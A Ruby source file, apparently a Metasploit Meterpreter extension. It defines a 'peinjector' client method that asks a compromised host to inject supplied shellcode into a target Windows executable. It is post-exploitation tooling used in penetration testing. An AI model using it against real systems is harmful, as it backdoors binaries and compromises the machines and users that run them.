# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/peinjector/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Peinjector


###
#
# This meterpreter extensions allow to inject a given shellcode into an executable file.
#
###
class Peinjector < Extension


  def initialize(client)
    super(client, 'peinjector')

    client.register_extension_aliases(
      [
        {
          'name' => 'peinjector',
          'ext'  => self
        },
      ])
  end


  def inject_shellcode(opts={})
    return nil unless opts[:shellcode]

    request = Packet.create_request('peinjector_inject_shellcode')
    request.add_tlv(TLV_TYPE_PEINJECTOR_SHELLCODE, opts[:shellcode])
    request.add_tlv(TLV_TYPE_PEINJECTOR_SHELLCODE_SIZE, opts[:size])
    request.add_tlv(TLV_TYPE_PEINJECTOR_SHELLCODE_ISX64, opts[:isx64])
    request.add_tlv(TLV_TYPE_PEINJECTOR_TARGET_EXECUTABLE, opts[:targetpe])

    response = client.send_request(request)

    error_msg = response.get_tlv_value(TLV_TYPE_PEINJECTOR_RESULT)
    raise error_msg if error_msg

    return response.get_tlv_value(TLV_TYPE_PEINJECTOR_RESULT)

  end

end

end; end; end; end; end
